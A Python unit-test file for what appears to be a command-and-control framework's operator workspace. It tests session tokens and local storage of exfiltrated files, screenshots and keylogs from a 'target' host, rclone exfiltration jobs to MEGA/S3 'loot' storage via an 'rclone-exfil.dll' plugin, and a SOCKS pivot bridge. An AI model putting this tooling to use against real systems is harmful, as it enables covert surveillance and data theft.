"""Unit coverage for workspace authentication and local persistence."""

import base64
import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import MagicMock, patch

from rmm_cli import RmmApiClient
from rmm_rclone import RcloneConfigError
from rmm_workspace import WorkspaceEventBroker, WorkspaceRegistry, valid_workspace_id
from rmm_socks import SocksManager
from rmm_tools import make_client
from workspace_service import WorkspaceService, WorkspaceStore


class WorkspaceControlPlaneTests(unittest.TestCase):
    """Verify workspace IDs, tokens, and bounded event cursors."""

    def test_workspace_id_validation_and_registry_authentication(self):
        self.assertTrue(valid_workspace_id("alice-exegol_1"))
        self.assertFalse(valid_workspace_id("../alice"))
        self.assertFalse(valid_workspace_id(""))

        registry = WorkspaceRegistry({"alice": "workspace-secret"})
        self.assertTrue(registry.authenticate("alice", "workspace-secret"))
        self.assertFalse(registry.authenticate("alice", "wrong"))
        self.assertFalse(registry.authenticate("bob", "workspace-secret"))
        self.assertEqual(registry.ids(), ["alice"])

    def test_registry_accepts_environment_json(self):
        with patch.dict(
            os.environ,
            {
                "RMM_WORKSPACES": '[{"id":"alice","token":"a"},{"id":"bob","token":"b"}]',
                "RMM_WORKSPACE_ID": "carol",
                "RMM_WORKSPACE_TOKEN": "c",
            },
            clear=False,
        ):
            registry = WorkspaceRegistry.from_environment()

        self.assertEqual(registry.ids(), ["alice", "bob", "carol"])

    def test_event_broker_reports_cursor_loss(self):
        broker = WorkspaceEventBroker(max_events=2)
        broker.publish("alice", "session-1", {"id": 1})
        broker.publish("alice", "session-1", {"id": 2})
        broker.publish("alice", "session-1", {"id": 3})
        broker.publish("alice", "session-1", {"id": 4})

        result = broker.read("alice", since=1, limit=10)
        self.assertTrue(result["reset_required"])
        self.assertEqual([row["event"]["id"] for row in result["events"]], [3, 4])
        self.assertEqual(result["next_cursor"], 4)

    def test_client_headers_include_workspace_scope(self):
        client = RmmApiClient(
            "http://central",
            extra_headers={
                "X-RMM-Workspace": "alice",
                "X-RMM-Workspace-Token": "secret",
            },
        )
        headers = client._headers()
        self.assertEqual(headers["X-RMM-Workspace"], "alice")
        self.assertEqual(headers["X-RMM-Workspace-Token"], "secret")

        with patch.dict(
            os.environ,
            {"RMM_WORKSPACE_ID": "alice", "RMM_WORKSPACE_TOKEN": "secret"},
            clear=False,
        ):
            client = make_client("http://central", token="")
        self.assertEqual(client.extra_headers["X-RMM-Workspace"], "alice")


class WorkspaceStoreTests(unittest.TestCase):
    """Verify local transcripts, chunk reassembly, artifacts, and chat storage."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.store = WorkspaceStore(self.temp_dir.name, "alice")
        self.session_id = "session-1234"
        self.store.sync_sessions(
            [{"id": self.session_id, "hostname": "target", "username": "user"}]
        )

    def tearDown(self):
        self.store.close()
        self.temp_dir.cleanup()

    def test_chunked_download_is_reassembled_only_at_eof(self):
        first = base64.b64encode(b"hello ").decode()
        second = base64.b64encode(b"workspace").decode()
        first_event = {
            "id": 1,
            "type": "file_upload",
            "workspace_payload": {
                "kind": "file_upload",
                "remote_path": "C:/Temp/report.txt",
                "data": {
                    "filename": "report.txt",
                    "content": first,
                    "offset": 0,
                    "eof": False,
                    "upload_id": "upload-1",
                },
            },
        }
        self.assertIsNone(self.store.apply_event(self.session_id, first_event))
        self.assertFalse(list(self.store.download_dir.iterdir()))

        final_event = {
            "id": 2,
            "type": "file_upload",
            "workspace_payload": {
                "kind": "file_upload",
                "remote_path": "C:/Temp/report.txt",
                "data": {
                    "filename": "report.txt",
                    "content": second,
                    "offset": 6,
                    "eof": True,
                    "upload_id": "upload-1",
                },
            },
        }
        materialized = self.store.apply_event(self.session_id, final_event)

        self.assertEqual(materialized["artifact"].rsplit("_", 1)[-1], "report.txt")
        artifact_path = self.store.artifact_path("downloads", materialized["artifact"])
        self.assertEqual(artifact_path.read_bytes(), b"hello workspace")
        downloads = self.store.list_downloads(self.session_id)
        self.assertEqual(downloads[0]["remote_path"], "C:/Temp/report.txt")

    def test_screenshot_keylog_events_and_ai_chat_stay_local(self):
        screenshot = self.store.apply_event(
            self.session_id,
            {
                "id": 3,
                "type": "screenshot",
                "workspace_payload": {
                    "kind": "screenshot",
                    "filename": "shot.png",
                    "content_b64": base64.b64encode(b"png-bytes").decode(),
                },
            },
        )
        keylog = self.store.apply_event(
            self.session_id,
            {
                "id": 4,
                "type": "keylog",
                "workspace_payload": {
                    "kind": "keylog",
                    "filename": "keys.log",
                    "content": "operator input",
                },
            },
        )

        self.assertEqual(
            self.store.artifact_path("screenshots", screenshot["artifact"]).read_bytes(),
            b"png-bytes",
        )
        self.assertEqual(
            self.store.artifact_path("keylogs", keylog["artifact"]).read_text(),
            "operator input",
        )
        self.assertTrue(
            self.store.save_ai_chat(
                self.session_id,
                [
                    {"role": "user", "content": "List sessions"},
                    {"role": "assistant", "content": "One session is online."},
                    {"role": "system", "content": "discard"},
                ],
            )
        )
        self.assertEqual(
            self.store.get_ai_chat(self.session_id)[1],
            [
                {"role": "user", "content": "List sessions"},
                {"role": "assistant", "content": "One session is online."},
            ],
        )

    def test_history_deletion_removes_local_events_and_downloads(self):
        self.store.apply_event(
            self.session_id,
            {
                "id": 1,
                "type": "output",
                "body": "whoami",
            },
        )
        self.store.sync_sessions([])
        self.assertEqual(len(self.store.list_history()), 1)
        ok, deleted_id, error = self.store.delete_history(self.session_id)

        self.assertTrue(ok)
        self.assertEqual(deleted_id, self.session_id)
        self.assertIsNone(error)
        self.assertEqual(self.store.list_history(), [])
        self.assertIsNone(self.store.get_events(self.session_id))

    def test_history_deletion_removes_workspace_artifacts(self):
        self.store.apply_event(
            self.session_id,
            {
                "id": 1,
                "type": "screenshot",
                "workspace_payload": {
                    "kind": "screenshot",
                    "filename": "shot.png",
                    "content_b64": base64.b64encode(b"png-bytes").decode(),
                },
            },
        )
        artifact = next(self.store.screenshot_dir.iterdir())
        self.store.sync_sessions([])
        ok, _deleted_id, _error = self.store.delete_history(self.session_id)

        self.assertTrue(ok)
        self.assertFalse(artifact.exists())


class WorkspaceRcloneTests(unittest.TestCase):
    """Verify rclone profiles and job construction stay in the workspace."""

    def make_service(self, capabilities):
        service = WorkspaceService.__new__(WorkspaceService)
        service.upstream = MagicMock()
        service.upstream.request.return_value = (200, capabilities, "application/json")
        return service

    def test_workspace_config_merges_local_profiles_with_central_capabilities(self):
        service = self.make_service(
            {
                "rclone_binary": False,
                "rclone_plugin": {"name": "rclone-exfil.dll"},
            }
        )
        with patch.dict(
            os.environ,
            {
                "RMM_RCLONE_PROFILES": '{"local":{"type":"mega","folder":"loot"}}',
                "RMM_RCLONE_PROFILES_FILE": "",
                "RMM_RCLONE_DEFAULT_PROFILE": "local",
                "RMM_RCLONE_MAX_BYTES": "0",
            },
            clear=False,
        ):
            config = service._rclone_config()

        self.assertTrue(config["workspace_local"])
        self.assertEqual(config["profiles_scope"], "workspace")
        self.assertEqual(config["profiles"][0]["name"], "local")
        self.assertEqual(config["default_profile"], "local")
        self.assertFalse(config["rclone_binary"])
        self.assertEqual(config["rclone_plugin"]["name"], "rclone-exfil.dll")

    def test_workspace_builds_plugin_job_without_server_profile_lookup(self):
        service = self.make_service(
            {
                "rclone_binary": False,
                "rclone_plugin": {"name": "rclone-exfil.dll"},
            }
        )
        session = {"agent_type": "go", "capabilities": ["pe"]}
        with patch.dict(
            os.environ,
            {
                "RMM_RCLONE_PROFILES": '{"local":{"type":"s3","secret_access_key":"secret"}}',
                "RMM_RCLONE_PROFILES_FILE": "",
            },
            clear=False,
        ):
            job, _config = service._workspace_exfil_job(
                session, "C:/Temp/report.txt", "local", None, "auto"
            )

        self.assertIn("plugin_job", job)
        self.assertNotIn("binary_payload", job)
        self.assertEqual(job["plugin_job"]["settings"]["secret_access_key"], "secret")

    def test_workspace_binary_mode_requires_central_bootstrap_capability(self):
        service = self.make_service({"rclone_binary": False, "rclone_plugin": None})
        session = {"agent_type": "powershell", "capabilities": []}
        with patch.dict(
            os.environ,
            {
                "RMM_RCLONE_PROFILES": '{"local":{"type":"s3"}}',
                "RMM_RCLONE_PROFILES_FILE": "",
            },
            clear=False,
        ):
            with self.assertRaisesRegex(RcloneConfigError, "bootstrap"):
                service._workspace_exfil_job(
                    session, "C:/Temp/report.txt", "local", None, "binary"
                )


class ExternalSocksBridgeTests(unittest.TestCase):
    """Verify central transport-only bridges do not bind operator listeners."""

    def test_external_bridge_round_trip_uses_task_and_response_batches(self):
        manager = SocksManager()
        manager.start_external("session-1")
        try:
            task = {"op": "connect", "id": "connect-1", "host": "10.0.0.1", "port": 443}
            self.assertTrue(manager.submit_external_tasks("session-1", [task]))
            self.assertEqual(manager.poll_tasks("session-1"), [task])
            response = {"op": "ok", "id": "connect-1"}
            self.assertTrue(manager.submit_agent_responses("session-1", [response]))
            self.assertEqual(manager.drain_external_responses("session-1"), [response])
        finally:
            manager.stop_all()


if __name__ == "__main__":
    unittest.main()
